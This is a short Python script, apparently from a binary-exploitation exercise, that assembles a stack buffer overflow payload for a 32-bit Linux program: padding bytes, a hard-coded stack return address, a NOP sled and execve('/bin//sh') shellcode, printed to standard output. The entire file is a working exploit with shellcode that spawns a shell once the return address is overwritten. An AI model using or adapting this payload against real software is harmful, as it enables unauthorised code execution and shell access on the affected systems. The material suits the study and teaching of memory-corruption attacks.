import sys

junk = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

# ffffcea0
# 0xffffcf48
# 0xffffce8c
# junk, ret address, nops, shellcode, update ret address

ret_address = b"\x8d\xce\xff\xff" 
nop = (b"\x90" * 4 * 25) + b"\x90"
bash = b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"


payload = junk + ret_address + nop + bash
print(payload)
#sys.stdout.buffer.write(payload)
